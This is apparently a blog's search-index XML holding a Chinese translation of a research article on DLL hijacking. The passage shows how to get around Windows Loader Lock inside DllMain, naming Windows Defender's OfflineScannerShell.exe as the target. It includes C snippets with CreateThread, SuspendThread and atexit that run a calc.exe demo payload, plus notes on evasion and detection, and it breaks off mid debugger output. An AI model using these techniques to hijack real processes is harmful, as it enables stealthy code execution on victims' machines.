<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>完美DLL劫持</title>
    <link href="/2023/12/25/perfect_dll_hijacking/"/>
    <url>/2023/12/25/perfect_dll_hijacking/</url>
    
    <content type="html"><![CDATA[<p>  <img src="/img/88421e19b1e9ee2000.png" alt="88421e19b1e9ee2000"></p><h1 id="完美DLL劫持"><a href="#完美DLL劫持" class="headerlink" title="完美DLL劫持"></a>完美DLL劫持</h1><p><strong>译者注：个人渣翻，如有侵权，请联系本人进行删除</strong><br><strong>Translator’s NOTE: Unauthorized translation, if infringement, please contact me for deletion</strong></p><p>DLL劫持(有时被称为DLL侧加载或DLL预加载)是一项通过欺骗合法进程(EXE)载入错误动态库(DLL)来注入第三方代码的技术。最常见的方式是将你伪造的DLL放置于搜索顺序优先于原DLL的路径，以此使你伪造的DLL首先被Windows库加载器(Windows library loader)选择</p><p>但作为一项决定性技术，DLL劫持在其被加载进入进程并执行第三方代码时一直存在一个<em>巨大的</em>缺陷，亦即Loader Lock死锁，且在我们的第三方代码被执行时其会受到所有严格的限制。其中包括创建进程，进行网络输入输出，调用注册函数，创建绘制窗口，加载其他库等等。在Loader Lock下尝试进行如上操作可能会导致程序崩溃或挂起。</p><p>直至现在，这一问题的解决方法或差强人意，或急速崩溃，或过度结构化.<strong>所以今天，我们在做的是100%的对Windows库加载器的原始逆向，不仅要干净利落地解决Loader Lock死锁，最终还要彻底禁用它。此外还要给出一些对应的修复&amp;检测机制以供防御者来防止DLL劫持。</strong></p><h2 id="关于DllMain"><a href="#关于DllMain" class="headerlink" title="关于DllMain"></a>关于DllMain</h2><p>DllMain是Windows中DLL的初始化函数。无论DLL何时被加载，DllMain与其中的代码(比如我们的第三方代码)总会被调用。DllMain运行在Loader Lock下，如先前提到的，它设置了一些限制来确保DllMain中的操作安全。</p><p><img src="/img/library-load-dllmain-loader-lock-state-transitions.png" alt="library-load-dllmain-loader-lock-state-transitions"></p><p><strong>具体来说，微软只是想让我们注意这样一个关于DllMain操作的小警告</strong></p><p>你永远不该在DllMain中执行下列任务:</p><ul><li><p>调用LoadLibrary或LoadLibraryEx(无论直接或间接)，这会导致死锁或崩溃</p></li><li><p>调用GetStringTypeA，GetStringTypeEx或GetStringTypeW(无论直接或间接)。这会导致死锁或崩溃</p></li><li><p>与其他线程同步，这会导致死锁或崩溃</p></li><li><p>获取等待获取loader lock的代码拥有的同步对象，这会导致死锁</p></li><li><p>使用ColnitializeEx初始化COM线程。在特定条件下，该函数会调用LoadLibraryEx。</p></li><li><p>调用注册函数</p></li><li><p>调用CreateProcess。创建进程会加载另外的DLL</p></li><li><p>调用ExitThread。如果您没有与其他线程同步，退出线程是可以工作的，但是这有风险。</p></li><li><p>调用CreateThread。如果您没有与其他线程同步，创建线是可以工作的，但是有风险。</p></li><li><p>调用ShGetFolterPathW。调用shell&#x2F;已知文件夹可能导致线程同步，从而触发死锁。</p></li><li><p>创建命名管道或其他命名对象(仅限Windows 2000)。在Windows 2000中，命名对象被终端服务DLL提供，若该DLL未被初始化，对该DLL的调用会导致进程崩溃。</p></li><li><p>使用动态C运行时(dynamic C Run-Time – CRT)中的内存管理函数。若CRT DLL未被初始化，对这些函数的调用可能会导致进程崩溃。</p></li><li><p>调用User32.dll或Gdi32.dll中的函数。一些函数会加载其他未被初始化的DLL。</p></li><li><p>使用托管代码(Use Managed code)。</p><p>正如微软所陈述的那样，这些是想让DllMain安全无潜在危险，无副作用地完成工作的“最佳实践”。是啊，可这些限制已经造成了如此之多的痛苦！在此为所有Win32开发者默哀。(还真是)</p></li></ul><h2 id="我们从何开始"><a href="#我们从何开始" class="headerlink" title="我们从何开始"></a>我们从何开始</h2><p>我研究的出发点源于安全专家Nick Landers(@monoxgas)发布在NetSPI的一篇内容丰富的文章叫 <strong><a href="https://www.netspi.com/blog/technical/adversary-simulation/adaptive-dll-hijacking/">“自适应DLL劫持”</a></strong> 。这是一份杰出的研究，我过去也用过一些由此产生的技术与工具(例如Koppeling)。正如所有的杰出研究必须得到进一步创新，而这也正是我们今天要做的！</p><p>目前遍观网络上关于DLL劫持(仅涉及DllMain)的文章大多要求您进行两个有问题的操作中的一个：</p><ol><li>更改内存保护属性(使用VirtualProtect)</li><li>修改指针</li></ol><p>第一条不那么理想，因为杀软标记了VirtualProtect操作，特别是创建读-写-运行权限内存或将读-写权限内存转换为读-写-运行权限内存。这是有充分理由的，因为改变可执行内存权限正是自修改程序的暗示，这可能是绕过严格杀软的最简单的方式。一个具有任意代码保护(Arbitrary code guard – ACG)的进程可以完全阻止可执行内存的 创建与修改。</p><p>第二条同样并非理想，因为指针是几乎所有下一代漏洞缓释措施(exploit mitigations，我将其理解为漏洞修复相关工作)的目标。举个例子，一个函数在Loader Lock释放之后在被修改的堆栈上返回地址来进行代码执行。该技术很受欢迎直到被即将到来的叫intel Control-flow Enforcement Technology(CET)的漏洞缓释措施终止。CET的CET交叉引用函数返回栈上的地址，同时“影子栈”被锁在CPU硬件中，以确保它们是有效且不可篡改的;否则直接强制终止恶意进程。指针被1:1认证的那天总会到来，所以最好是整个避免指针修改来保证这项技术的时效性。</p><p>我还注意到一些现有的技术，虽然是通用的，但是却有些冗长与复杂，或是只为了动态加载或只为了静态加载而设计。一些方法还需要以稳定进程持续性为方向。(Some methods also need to feature stable process continuation)</p><p>避免这些有问题的操作正是我们将在此探究的技术的要求。</p><h2 id="安全研究的心态"><a href="#安全研究的心态" class="headerlink" title="安全研究的心态"></a>安全研究的心态</h2><p>在你探索未知领域时，很容易变得困惑并且放弃太快。这就是为什么提醒自己我们必须做什么十分重要，如此以来创造力便会发挥作用。于我而言，在进行此项研究之前，我先发现了一个内存崩溃漏洞(即缓冲区溢出)，允许不受信任的数据控制_call_指令的目的地(即任意调用)，因此几乎导致了远程任意代码执行。</p><p>在DLL劫持的情况下，我们被给予了三个基本访问权限，包括对程序的任意(虚拟)内存的<strong>读，写和调用</strong>。我们还会经常与Windows库中许多的<em>（注：wired machines应该指的是程序安全分析理论模型）</em>wired machines(非常多代码)打交道，因为我们才是代码的编写者(即使我们的代码还运行在Loader Lock下的DllMain中)。此外，我们也许会在被劫持的进程的虚拟内存空间之外直接对内核使用系统调用，此时也需要我们与wired machines交互。我们很容易会将这些奢侈的用法视为理所当然，直到遇到更加受限的攻击场景。</p><p>这些都是为了说明一点，允许我们干净利落(即没有改变内存的保护属性)地在Loader Lock释放之后(甚至或者直接禁用它)的DllMain中重定向代码执行的机制不存在的概率基本上是零。作为研究者，我们要自信地进行探索，并且知晓我们真正在寻找的东西。这就是我开始研究时的心态。</p><p><strong>信息</strong></p><p>Loader Lock并非安全边界，只是一个对于DLL劫持和其他程序使用上的小麻烦。但这并不意味着其他程序不能使用同样的思想。</p><p>此处的”Lock”就是互斥锁，一个并发中的概念。如果你是计算机科学专业的， 那么你很有可能会学到这个概念。</p><h2 id="我们的目标"><a href="#我们的目标" class="headerlink" title="我们的目标"></a>我们的目标</h2><p>我们将尝试对Windows默认内置的<code>C:\Program Files\Windows Defender\Offline\OfflineScannerShell.exe</code> 进行我们的DLL劫持技术。</p><p><img src="/img/offlinescannershell-location.png" alt="offlinescannershell-location"></p><p>尝试运行该程序(使用双击)将会爆出如下错误恰说明这个程序容易受到DLL劫持。</p><p><img src="/img/offlinescannershell-mpclient-dll-not-found-error.png" alt="offlinescannershell-mpclient-dll-not-found-error"></p><p>该现象发生是因为<code>mpclient</code>的位置在<code>C:\Program Files\Windows Defender</code>，在当前<code>Offline</code>目录的上一级。故想要正确的启动程序需要首先将当前工作目录(CWD)切换至<code>C:\Program Files\Windows Defender</code>(用CMD很容易做到)。这样<code>mpclient.dll</code>存在于搜索路径中，于是<code>OfflineScannerShell.exe</code>便成功运行了。</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs livescript">C:<span class="hljs-string">\&gt;cd</span> C:<span class="hljs-string">\Program</span> Files<span class="hljs-string">\Windows</span> Defender<br>C:<span class="hljs-string">\Program</span> Files<span class="hljs-string">\Windows</span> Defender&gt;Offline<span class="hljs-string">\OfflineScannerShell.exe</span><br><br>C:<span class="hljs-string">\Program</span> Files<span class="hljs-string">\Windows</span> Defender&gt;echo %ERRORLEVEL%<br><span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>然而，如果我们将CWD任意设置比如用户文件夹(<code>C:\Users\&lt;你的用户名&gt;</code>)那么当<code>OfflineScannerShell.exe</code>搜索<code>mpclient.dll</code>时我们便可以使其加载我们复制的<code>C:\Users\&lt;你的用户名&gt;\mpclient.dll</code>!</p><p>以及存在于全局环境变量<code>PATH</code>中的路径(此处打印在CMD中)也能起作用：</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-name">C</span>:\Users\user&gt;echo %PATH%<br><span class="hljs-name">C</span>:\Windows\system32;<span class="hljs-name">C</span>:\Windows;<span class="hljs-name">C</span>:\Windows\System32\Wbem;<span class="hljs-name">C</span>:\Windows\System32\WindowsPowerShell\v1<span class="hljs-number">.0</span>\;<span class="hljs-name">C</span>:\Windows\System32\OpenSSH\;<span class="hljs-name">C</span>:\Users\&lt;YOUR_USERNAME&gt;\AppData\Local\Microsoft\WindowsApps<br></code></pre></td></tr></table></figure><p><code>C:\Users\&lt;你的用户名&gt;\AppData\Local\Microsoft\WindowsApps</code>是另外一个<code>OfflineScannerShell.exe</code>加载DLL的默认存在于Windows且用户可写的完美路径，如果你不想设置当前工作目录的话。</p><p>正如我们稍后即将发现的，<strong>Windows中深嵌着许多可以被我们使用新技术DLL劫持的目标</strong>，但我就是喜欢这个。</p><h3 id="我们的Payload"><a href="#我们的Payload" class="headerlink" title="我们的Payload"></a>我们的Payload</h3><p>作为示例的payload，我们将通过如下命令启动计算器。</p><p><code>ShellExecute(NULL, L&quot;open&quot;, L&quot;calc.exe&quot;, NULL, NULL, SW_SHOW);</code></p><p>然而，有一点很重要我们必须切实认识到，你得在payload执行之后继续运行白程序(被劫持的)的剩余部分；否则就违背了DLL劫持的原意(在大多数场景中)。对于红队而言，在白程序中生成一个反弹shell(Metasploit或Colbalt Strike的)同时保重白程序照常运行(没有任何异常情况发生的迹象)可能才是最理想的payload。</p><p>为什么我们用<code>ShellExecute</code>。其实<code>ShellExcute</code>正是完美的在NTDLL中试错的工具。这是因为众所周知这个API会与Windows的大量子系统交互。从库加载器到COM&#x2F;COM+，使用APC，RPC，WINRT存储调用，CRT函数，注册函数，甚至创建了一个完整的新线程之为了启动一个应用(<code>calc.exe</code>)!<code>ShellExecute</code>大概是整个Windows API中最臃肿且复杂的API(当然在ShellExecuteEx之后)，所以这个函数理所当然的作为技术是否成功的验证。</p><p>与其他大多数在DllMain中的违禁操作一样，尝试在不进行其他操作的情况下调用<code>ShellExecute</code>(且尤其是ShllExecute)最终是盛大地陷入了象征噩兆的死锁，于<code>ntdll!NtAlpcSendWaitReceivePort(??)</code>处失败了，造成了程序的永久挂起：</p><p><img src="/img/shellexecute-initial-deadlock-point.png" alt="shellexecute-initial-deadlock-point"></p><p>搜索该函数(与其邻居函数)蹦出来的结果微乎其微，因为全都没归档！我就喜欢这样。</p><p>另外几次，你可能会在<code>ntdll!TppRaiseInvalidParameter</code>报错崩溃因为一个内部函数想要在调用栈再深一点的地方(???)返回一个好的NTSTATUS(该情况下，STATUS_INVALID_PARAMETER)。尝试再乱搞一通，最后你会直面一个言简意赅的内存访问违规。就像巧克力盒子，你永远不知道你会从里面得到什么。</p><p>来看看我们能否改变这个情况！</p><h3 id="完美候选"><a href="#完美候选" class="headerlink" title="完美候选"></a>完美候选</h3><p><code>OfflineScannerShell.exe</code>是我在DLL劫持(至少在存在的技术中)中被称为“最坏的一类情况”。不过这恰好能够说明我们的新技术能够普遍运作。使<code>OfflineScannerShell.exe</code>成为最坏的一类情况的因素主要来自以下几件事：</p><ul><li><p>不调用可劫持的DLL的导出函数，所以必须使用DllMain来重定向代码执行</p><ul><li>许多带有可劫持DLL的程序会提前退出除非有特殊前置条件。<ul><li>不过大多数情况下这些前置条件不可能遇得上。</li></ul></li><li>这点是我在<code>MpClient.dll</code>的每个导出函数设置了断点之后运行<code>OfflineScannerShell.exe</code>之后验证出来的。</li></ul></li><li><p>程序在运行之后立马退出了(没有保持打开，闲置，或是等待)</p></li><li><p>可劫持的DLL是被静态加载的(并非通过调用<code>LoadLibrary</code>来在程序运行时动态加载)</p><ul><li>通常来说，这是因为你在库加载器内部的更深处(进程仍在启动)</li></ul></li></ul><p>基本上就是如此，如果你的目标程序在其存活周期中调用了它的可劫持DLL的导出函数，那你就已经成功了，因为你可以随意重定向代码执行，根本不用烦恼DllMain与Loader Lock的冲突问题。这也被叫做DLL代理。然而在我见过的大多数DLL可劫持的主流情况中，经常是一个难以言说的只有少数当程序运行得十分深入才会被调用的DLL，很难(甚至根本不能)达到调用除非程序运行在正好的环境之中。而且这些程序会直接退出，因为，举个例子，你正运行一个连接着可被劫持DLL的可执行服务，但只要你启动可执行服务，其会发现自己并未被正确启动(作为一个Windows服务)并且马上退出了。这使本应很简单的劫持工作变得复杂，但我们已经能够在程序运行后的DllMain中执行代码，只不过是在臭名昭著的Loader Lock之下。</p><p>据我所知，唯一关于<code>OfflineScannerShell.exe</code>DLL劫持方面顺利的事就是其连接着C运行时(CRT)，换句话说就是，它不是个纯Windows API(Win32)程序。但是Windows中绝大多数程序都是与CRT连接的，所以这也算不上独一无二的优点。至于为什么这是优点，我们等会会涉及到。</p><h2 id="新技术"><a href="#新技术" class="headerlink" title="新技术"></a>新技术</h2><h3 id="主线程竞态"><a href="#主线程竞态" class="headerlink" title="主线程竞态"></a>主线程竞态</h3><p>该技术基于NetSPI上发布的”自适应DLL劫持”。</p><p>我最初在这项技术上做的拓展在我们的目标上无法达到100%的成功率。但是这提供了一个很好的学习经验，这也是为什么我将其包含了进来。在这节的结尾部分，我提示了一个这项技术的另一个稍微不同于我们的拓展的方法，100%的成功率也近在咫尺(即将到来)。</p><p><strong>如果你迫不及待想了解最好的新技术，尽管跳过到下一节</strong></p><h4 id="初始实验"><a href="#初始实验" class="headerlink" title="初始实验"></a>初始实验</h4><p>正如上边陈述的微软的“最佳实践”文档，在<code>DllMain</code>中“可以”调用<code>CreateThread</code>：</p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs objectivec"><span class="hljs-comment">// DllMain模板代码，每个DLL中都要有</span><br><span class="hljs-type">BOOL</span> WINAPI DllMain(HINSTANCE hinstDll, DWORD fdwReason, LPVOID lpvReserved)<br>&#123;<br>    <span class="hljs-keyword">switch</span> (fdwReason)<br>    &#123;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>        <span class="hljs-comment">// 创建一个线程</span><br>        <span class="hljs-comment">// 线程再去运行我们的&quot;CustomPayloadFunction&quot;(此处没有显示)</span><br>        DWORD threadId;<br>        HANDLE newThread = CreateThread(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, (LPTHREAD_START_ROUTINE)CustomPayloadFunction, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, &amp;threadId);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">TRUE</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>成功了！但是还有一个问题，因为被<code>CreateThread</code>创建的线程(不止这个原因)会等到我们离开DllMain后再开始运行。要解决这个问题要求我们调用<code>CreateThread</code>，允许程序退出DllMain(Loader Lock之类的限制会在这之后一小会被释放)，接着祈求线程能够在程序主线程退出之前被创建。</p><p>创建线程是个相对昂贵的操作，所以如果我们的目标程序退出得相当快，我们可能就会输掉这场竞速。也许我们可以通过某种方式来增加我们的胜算…</p><h5 id="增加胜算"><a href="#增加胜算" class="headerlink" title="增加胜算"></a>增加胜算</h5><p>比如调用<code>SetThreadPriority</code>来提升我们新入队的线程的优先级至<strong>最高等级</strong>(<code>THREAD_PRIORITY_TIME_CRITICAL</code>)同时降低主线程的优先级至<strong>尽可能低</strong>(<code>THREAD_PRIORITY_IDLE</code>；该优先级甚至比<code>THREAD_PRIORITY_LOWEST</code>还要低！)</p><p>如此拓展我们之前的代码，我们可以在<code>CreateThread</code>之后加上这两句：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs C">SetThreadPriority(newThread, THREAD_PRIORITY_TIME_CRITICAL);<br>SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_IDLE);<br><br><span class="hljs-comment">//接着从DllMain中返回并祈祷胜利...</span><br></code></pre></td></tr></table></figure><p>对于<code>OfflineScannerShell.exe</code>，最终证明设置线程优先级并不是必须的，因为无论如何程序也做了足够的事在退出之前争取时间，然而设置线程优先级还是在我将dll与程序放在一起只为了静态加载我们的Dll的简单测试中一定程度上提供了更高的胜算。所以，我们不妨将此次实验记为一个小小的胜利。</p><h5 id="暂停主线程"><a href="#暂停主线程" class="headerlink" title="暂停主线程"></a>暂停主线程</h5><p>现在既然我们触及了在新线程中的<code>CustomPayloadFunction</code>，那么便需要快速地在退出程序之前暂停主线程。在新线程中使用<code>SuspendThread</code>挂起我们的主线程是最明显的达到目的方法所以我们先用它。想要挂起线程，<code>SuspendThread</code>要求提供目标线程的句柄。</p><p>足够简单，稍稍改动以下我们之前的<code>CreateThread</code>，我们首先通过<a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getcurrentthread">GetCurrntThread</a>来获取当前线程(main)的句柄。接着我们将该线程句柄作为<code>CustomPayloadFunction</code>的参数传递，就像这样：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">//将GetCurrentThread()的结果作为参数传递给CustomPayloadFunction</span><br>HANDLE newThread = CreateThread(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, (LPTHREAD_START_ROUTINE)CustomPayloadFunction, GetCurrentThread(), <span class="hljs-number">0</span>, &amp;threadId);<br></code></pre></td></tr></table></figure><p>然后在<code>CustomPayloadFunction</code>(新线程)中挂起传递过来的线程：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs C">VOID <span class="hljs-title function_">CustomPayloadFunction</span><span class="hljs-params">(HANDLE mainThread)</span> &#123;<br>    SuspendThread(mainThread);<br><br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><p>但是此处暗藏着一个bug，<strong>你能找到它吗？</strong></p><p>这个bug我早在几年前就遇到过，只不过当时我只是个没有WinDbg经验的C与Win32的编程新手，所以我当时没法解决它。</p><p>这个错误出现是因为<code>GetCurrentThread</code>返回的并非<strong>真正</strong>的句柄；而是返回一个<strong>伪句柄</strong>。<code>GetCurrentThread</code>(在x86-64中)仅仅是一个固定返回<code>0xFFFFFFFFFFFFFFFE</code>的桩(stub)：</p><p><img src="/img/getcurrentthread-disassembly.png" alt="getcurrentthread-disassembly"></p><p>因此，向我们的新线程传递该值会导致函数去引用传递过去的线程，而非我们先前调用<code>GetCurrentThread</code>的线程。这个bug非常隐蔽并且只会在你对Win32编程十分熟悉或者遍历过官方文档(而非只让Visual Stdio的自动联想主导你，就和我一样)时作为一个显然的问题被发觉。我们真正想要的正确的解决方法是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs C">HANDLE mainThread = OpenThread(THREAD_SUSPEND_RESUME, FALSE, GetCurrentThreadId());<br></code></pre></td></tr></table></figure><p>我们使用当前线程的<strong>ID</strong>创建了一个可以被正确作为参数传递给新线程的<strong>真句柄</strong>。只给我们的句柄提供所需最低的<code>THREAD_SUSPEND_RESUME</code>权限，我们的用例就完美运行了。</p><p>一般情况下，将主线程的ID传递给新线程，然后在新线程中创建句柄才意味着明了清晰的代码风格。但在这个独特的情况下，我们希望尽可能快地在新线程中挂起主线程，故提前打开句柄是更好的选择。我们只需要在新线程中注意不要忘记关闭句柄造成数据泄露。Windows同样还限制了单个进程能够拥有的句柄数，故如果目标泄露了大量句柄，这会对我们的与应用造成有效的DoS。总之，这不是一堂编程课但知晓最佳实践总是好的(讽刺的是，我们还要继续跟这些实践对着干)！</p><h5 id="挂起线程的问题"><a href="#挂起线程的问题" class="headerlink" title="挂起线程的问题"></a>挂起线程的问题</h5><p>这项技术最后一个需要跨越的障碍正好是被微软在<a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-suspendthread#remarks">SuspendThread</a>文档中为我们总结好的：</p><blockquote><p>此函数主要用于调试器。 它不用于线程同步。 如果调用线程尝试获取暂停线程拥有的同步对象，在拥有同步对象的线程（如互斥体或关键部分）上调用 <strong>SuspendThread</strong> 可能会导致死锁。 为避免这种情况，应用程序中不是调试器的线程应向另一个线程发出信号，以暂停自身。 目标线程必须设计为watch此信号并做出适当的响应。</p></blockquote><p>这就带来了竞态方法的最大的问题。在<code>OfflineScannerShell.exe</code>中，这个问题在程序每执行十次左右便会出现，因为主线程在进行堆内存分配&#x2F;释放时被挂起了。在Windows中，每个进程都有system提供的默认堆(也可以通过<code>GetProcessHeap</code>获取)。这个堆被设置为<code>HEAP_NO_SERIALIZE</code>(<a href="https://en.wikipedia.org/wiki/Thread_safety#Implementation_approaches">序列化此处指互斥锁</a>)置空，代表对该堆的分配与释放函数会导致该堆被锁定后解锁。换句话说，对于一个未被序列化的堆(<code>HEAP_NO_SERIALIZE</code>置1)，保证其跨线程访问的安全性将由程序员负责。我们可以通过在线程中调用<code>HeapUnlock(GetProcessHeap())</code>来一次性地删除这个堆的互斥锁。但是这违反了线程安全保证。可能会导致主线程崩溃或在恢复线程后出现非预期操作。</p><p>举个例子，在我们的测试中我们使用<code>ShellExecute</code>来运行<code>calc.exe</code>作为我们的最终payload装载至新线程。那么，<code>ShellExecute</code>(同其他类似的复杂Win32函数)必须对进程堆进行分配，此时若是我们不解锁堆便可能会导致死锁出现。在<code>OfflineScannerShell.exe</code>中，我还没见过<code>HeapUnlock</code>真的导致崩溃的情况，但是若是我们在新线程中使用<code>HeapUnlock(GetProcessHeap())</code>接着<code>HeapAlloc</code>(等同于malloc)，最后恢复主线程时，崩溃发生的概率并不是零。</p><p><img src="/img/heap-allocate-deadlock-thread-1.png" alt="heap-allocate-deadlock-thread-1"></p><p><img src="/img/heap-allocate-deadlock-thread-2.png" alt="heap-allocate-deadlock-thread-2"></p><p><em>死锁发生是因为被挂起的主线程占用着堆锁(亦即critical section)，但新线程又在尝试获取该锁。两方都无法取得进展，故整个程序就永久挂起了</em></p><h4 id="不同的方案？"><a href="#不同的方案？" class="headerlink" title="不同的方案？"></a>不同的方案？</h4><p>在该技术的当前阶段，我们假设你想让宿主进程保持运行直至它的自然终结(我们也是这么做的)，这套解决方案最高只能达到99%的有效。这是个有趣的实验，但我们能做得更好。</p><p>本质上，当我们在新线程中挂起主线程时，我们需要能够控制主线程的位置。我能想到</p><p>最简洁的方法就是使用锁。我们可以在<code>DllMain</code>中获取一些锁(由我细细道来)，这将导致主线程在代码中可预测的位置停止，因为它也在等待获取同一个锁。当我们启动新线程时，我们执行我们的payload，接着我们释放锁让程序继续照常运行(同时保证不要太快退出)。使用这个方法，我们再也不用搞什么进程挂起因为这些锁已经帮我们搞完了！我还没有试过这个方法，因为我想出来的时候我正在写这篇文章，不过我感觉这是个必胜策略。</p><p>下篇文章我们再细说这个！</p><h4 id="启发式检测方法"><a href="#启发式检测方法" class="headerlink" title="启发式检测方法"></a>启发式检测方法</h4><p>尽管如此，在<code>DllMain</code>中调用<code>CreateThread</code>(以及其他一些启发式检测方法)可以作为反恶意软件检测的特征，因此对于红队来说，这项技术还有待改进。如果防御者想用它作为检测DLL劫持的启发式方法，那么我建议你在<code>&lt;DLL_NAME&gt;!DllMain</code>之前hook <code>ntdll!LdrCallinitRoutine</code>初始调用到我们DLL时的<code>&lt;DLL_NAME&gt;!dllmain_dispatch</code>。你可以从之前“我们的Payload”一节展示的图片中看到这个调用栈的样子。如果你在周期内看到任何可疑的Windows API调用，比如<code>CreateThread</code>，这可能正是DLL劫持的症状。这样做是必要的，而不是当某些可疑的Windows API函数被调用时简单地分析调用堆栈，因为调用堆栈很容易被临时欺骗。即使使用Intel CET，调用栈仍然可以临时伪造(例如，在调用<code>CreateThread</code>之前)，接着在函数(<code>DllMain</code>)返回时将其改回来并传递返回地址到完整性检测。</p><h3 id="在结束前逃逸"><a href="#在结束前逃逸" class="headerlink" title="在结束前逃逸"></a>在结束前逃逸</h3><p><img src="/img/atexit-sign.jpg" alt="atexit-sign"></p><p>在<a href="https://en.wikipedia.org/wiki/ANSI_C">标准C</a>中，存在一个叫<code>atexit</code>的函数，目的是(正如其名)在程序出口处运行给定的函数。所以，如果我们简单地在<code>DllMain</code>中使用<code>atexit</code>设置个退出断点(原文：trap)，在程序退出时，我们便逃脱了名为Loader Lock的熊熊烈焰：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">// DllMain模板代码，存在于每个DLL中</span><br>BOOL WINAPI <span class="hljs-title function_">DllMain</span><span class="hljs-params">(HINSTANCE hinstDll, DWORD fdwReason, LPVOID lpvReserved)</span><br>&#123;<br>    <span class="hljs-keyword">switch</span> (fdwReason)<br>    &#123;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>        <span class="hljs-comment">// CustomPayloadFunction将在程序出口被调用</span><br>        atexit(CustomPayloadFunction);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure><p>于是我们得来看看<code>CustomPayloadFunction</code>(即此处展示的<code>payload</code>)，在数小时的调试与折磨之后，我们接下来发现的东西会震惊到你：</p><p><img src="/img/dll-atexit-handler-runs-under-loader-lock.png" alt="dll-atexit-handler-runs-under-loader-lock"></p><p><strong><code>atexit</code>函数同样运行在Loader Lock中！！-_-</strong></p><p>我费了挺大功夫才认识到这个事实，因为我需要更直观的观测Loader Lock是否存在的方法。在那时我仅有的(笨拙的)用来检验Load Lock存在的方法就是做一些我认为在Loader Lock中不可能做到的事。如果这些操作成功了，我便认为我们已经从Load Lock中解放了(提示：不过我们没成功)。</p><p>直到偶然发现Raymond Chen(一个微软的资深Windows内部专家)在Old New Thing博客上提到的这个超有用的信息： <strong><a href="https://devblogs.microsoft.com/oldnewthing/20140808-00/?p=293"><code>!critsec ntdll!LdrpLoaderLock</code></a></strong></p><p>考虑到Loader Lock问题再Windows API(Win32)编程中是一个十分常见的问题，我觉得这条信息应该被明显地记录在微软的官方文档中(也许该放在“调试”篇)而不是仅仅被提及在一两篇老博客中，或是分散在各种问题跟踪过程中，还有现在的这篇文章中。同样值得注意的是，在<code>!locks -v</code>的输出中也找不到Loader Lock。该命令列出了一些锁，但是不知道为啥<code>ntdll!LdrpLoaderLock</code>(甚至锁上的时候)没有包含在内。所以，除了在网上搜，搜索调试符号名或者在NTDLL的critical section设置断点(尽管我当时不知道Loader Lock是如何实现的)之外也没有更简单的解决方法了。</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; <span class="hljs-title">!locks</span> -v<br><br>CritSec ntdll<span class="hljs-title">!RtlpProcessHeapsListLock</span><span class="hljs-number">+0</span> at <span class="hljs-number">00007</span>ff<span class="hljs-number">94e17</span>ace<span class="hljs-number">0</span><br>LockCount          NOT LOCKED<br>RecursionCount     <span class="hljs-number">0</span><br>OwningThread       <span class="hljs-number">0</span><br>EntryCount         <span class="hljs-number">0</span><br>ContentionCount    <span class="hljs-number">0</span><br><br>CritSec <span class="hljs-number">+13</span>d<span class="hljs-number">202</span><span class="hljs-keyword">c</span><span class="hljs-number">0</span> at <span class="hljs-number">0000024</span>a<span class="hljs-number">13</span>d<span class="hljs-number">202</span><span class="hljs-keyword">c</span><span class="hljs-number">0</span><br>LockCount          NOT LOCKED<br>RecursionCount     <span class="hljs-number">0</span><br>OwningThread       <span class="hljs-number">0</span><br>EntryCount         <span class="hljs-number">0</span><br>ContentionCount    <span class="hljs-number">0</span><br><br>... *snip* More unnamed 